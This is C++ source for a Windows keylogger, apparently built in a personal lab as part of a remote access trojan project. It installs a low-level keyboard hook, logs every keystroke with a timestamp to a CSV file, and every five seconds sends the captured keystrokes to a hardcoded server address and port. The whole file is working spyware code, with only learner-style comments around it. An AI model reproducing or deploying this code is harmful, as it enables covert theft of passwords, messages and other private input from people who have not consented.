#include <iostream>
#include <windows.h>
#include <string>
#include <fstream> 
#include <thread>
#include <mutex>
#include <unordered_map>
#include <chrono>
#include <ctime>
#include <vector>
#include <sstream>
#include <winuser.h>
#include <C:\Users\thelab\development\RAT\network.h>
#include <locale>
#include <codecvt>

HHOOK keyboardHook = NULL;
std::vector<std::pair<std::string, std::wstring>> keystrokeVector;
std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter; //Convert wstring to string
std::unordered_map<DWORD, bool> keyStates;
std::mutex bufferMutex; 
NetworkClient client("192.168.56.101", 54000); 

bool SendVectorToServer() {
    
    std::string keystrokeData;

    for (const auto& entry : keystrokeVector) {
        keystrokeData.append(entry.first)
        .append(",")
        .append(converter.to_bytes(entry.second))
        .append("\n");
    }
    // clear the keystorke vector, also does this in WriteVectorToFile
    if (keystrokeData.empty()) {
        return true;
    }
    
    return client.sendData(keystrokeData);
}



void WriteVectorToFile() {
    std::wofstream outFile("keystrokes.csv", std::ios::app);
    if (!outFile.is_open()) {
        std::cerr << "Failed to open file for writing: " << GetLastError();
        return; 
    } 
    std::lock_guard<std::mutex> guard(bufferMutex);

    for (const auto& entry : keystrokeVector) {
        outFile << entry.first.c_str() << L"," << entry.second << L"\n";
    }

    keystrokeVector.clear();
    outFile.close();
}

void PeriodicVectorFlush() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(5)); //Flush every 5 secs.
        

        if (!client.connectToServer()) {
            std::cerr << "Failed to connect to server! \n";
            continue; // try again next sleep periode 
        }

        if (!SendVectorToServer()) {
            std::cerr << "Failed to send data to server! \n";
        }
        
        WriteVectorToFile();
    }
}

std::string GetTimestap() {
    auto now = std::chrono::system_clock::now();
    std::time_t now_time = std::chrono::system_clock::to_time_t(now);
    char buffer[26];
    ctime_s(buffer, sizeof(buffer), &now_time); //Converts time_t variable to a c-string of the current time.
    buffer[24] = '\0'; //Remove next line character. 
    return std::string(buffer);
}

wchar_t VirtualKeyTochar(DWORD vkCode, bool shiftPressed, bool altGrPressed, UINT flags) {
    
    BYTE keyboardState[256]; // Buffer of all the 256 possible virtual keyboard states in windows. 
    GetKeyboardState(keyboardState); // Fill the array with the current keyboard state. 

    if (shiftPressed) {
        keyboardState[VK_SHIFT] = 0x80;
    } else {
        keyboardState[VK_SHIFT] = 0;
    }

    // Can change size later if needed. 
    wchar_t buffer[256] = {0}; // Buffer holding the resulting unicode characters.
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC); // Consider different versions of MapVirtualKey.

    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 256, flags);
    std::wcout << L"Result: " << result << L" - Buffer[0]: " << buffer[0] << "\n"; 
  
    if (result > 0) {
        //std::wcout << L"Buffer: " << buffer << "\n";
        return buffer[0];
    } else if (result == 0) {
        std::wcout << L"No translation for VK:" << vkCode << "\n"; 
    }

    return 0;
}



LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {

        try {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = kbdStruct->vkCode;
        UINT flags = kbdStruct->flags;

            //Why place mutex here? 
            std::lock_guard<std::mutex> guard(bufferMutex);
            if (wParam == WM_KEYDOWN) { //wPrarm == WM_SYSKEYDOWN
                

                    // Checks if the shift key is pressen. TODO: understand why we use this notation.
                    bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0 || (GetKeyState(VK_LSHIFT) & 0x8000) != 0 || (GetKeyState(VK_RSHIFT) & 0x8000) != 0;
                    bool altGrPressed = (GetKeyState(VK_RMENU) & 0x8000) != 0 && (GetKeyState(VK_CONTROL) & 0x8000) != 0;

                    wchar_t character = VirtualKeyTochar(vkCode, shiftPressed, altGrPressed, flags);
                    std::string timestamp = GetTimestap();
                    std::wstring keypress;

                    if (character != 0) {
                        keypress = character; 
                    } else {
                        keypress = L"[VK:" + std::to_wstring(vkCode) + L"]";
                    }

                    keystrokeVector.emplace_back(timestamp, keypress); 
            
                 
            }
        
            //Log that a key has been released.        
            else if (wParam == WM_KEYUP) { //wPrarm == WM_SYSKEYDOWN
                keyStates[vkCode] = false; 
            } 
        } catch (const std::exception e) {
            std::cerr << "Exception in keyboardproc. \n" << e.what();
        }
        
    }
        
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam); 
}


int main() {

    std::thread flushThread(PeriodicVectorFlush);
    flushThread.detach(); // Run the flushThread thread independently from the main thread. 
    
    // Install keyboard hook.
    keyboardHook = SetWindowsHookExW(
        WH_KEYBOARD_LL,
        KeyboardProc, 
        GetModuleHandle(NULL),
        0); 

    // Handle error if we fail to install hook.
    if (keyboardHook == NULL) {
        std::cerr << "(-) failed to install hook: " << GetLastError() << std::endl;
        return 1;
    }


    // Message loop: Dispatch messages generated from the events in the hook 
    MSG msg; 
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    // Unsintall hooks.
    UnhookWindowsHookEx(keyboardHook);

    return 0;
};